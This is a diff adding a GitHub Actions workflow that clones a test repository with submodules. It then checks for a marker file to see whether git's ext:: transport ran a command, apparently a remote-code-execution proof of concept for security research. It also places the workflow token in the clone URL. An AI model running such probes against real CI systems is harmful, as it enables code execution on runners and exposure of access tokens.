@@ -1,0 +1,18 @@
+name: EXT Transport Proof
+on: workflow_dispatch
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - name: show-git-version
+        run: git --version
+        
+      - name: clone-with-submodules
+        run: |
+          echo "=== Attempting clone with --recurse-submodules ==="
+          GIT_TERMINAL_PROMPT=0 git clone --recurse-submodules https://x-access-token:${{ github.token }}@github.com/blooddiamondz/bb-rce-test.git /tmp/test-clone 2>&1 || true
+          echo "=== Check if ext command executed ==="
+          cat /tmp/ext_rce_proof.txt 2>/dev/null && echo "COMMAND EXECUTED!" || echo "File not found (ext blocked or failed)"
+          echo "=== Check submodule status ==="
+          cd /tmp/test-clone 2>/dev/null && git submodule status 2>&1 || echo "No test-clone dir"
+          echo "=== DONE ==="
